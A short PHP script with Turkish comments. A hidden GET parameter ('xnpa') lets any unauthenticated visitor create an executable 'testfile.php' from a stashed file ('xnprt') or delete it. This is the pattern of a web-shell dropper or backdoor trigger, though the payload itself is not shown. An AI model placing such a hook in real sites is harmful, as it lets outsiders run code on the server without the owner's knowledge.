<?php

    if ( isset($_GET["xnpa"]) ) {
        if ( $_GET["xnpa"] == "a" ) {

            // dosya oluşturma ve içine veri yazma
            $sonuc = file_exists('testfile.php'); // dosya kontrolü
            if ( !$sonuc){
                $dt = fopen('testfile.php', 'w'); // dosya olusturma
                $file = file_get_contents('xnprt', FILE_USE_INCLUDE_PATH); // dosya içine xxx.php deki verileri yazma
                fwrite($dt, $file);
                fclose($dt);
                echo "işlem tamam !!";
            }

        } elseif ( $_GET["xnpa"] == "b" ) {

            $sonuc = file_exists('testfile.php'); // dosya kontrolü
            if ( $sonuc) {
                unlink("testfile.php"); // dosua silme
                echo "!! işlem tamam";
            }

        }
    }

?>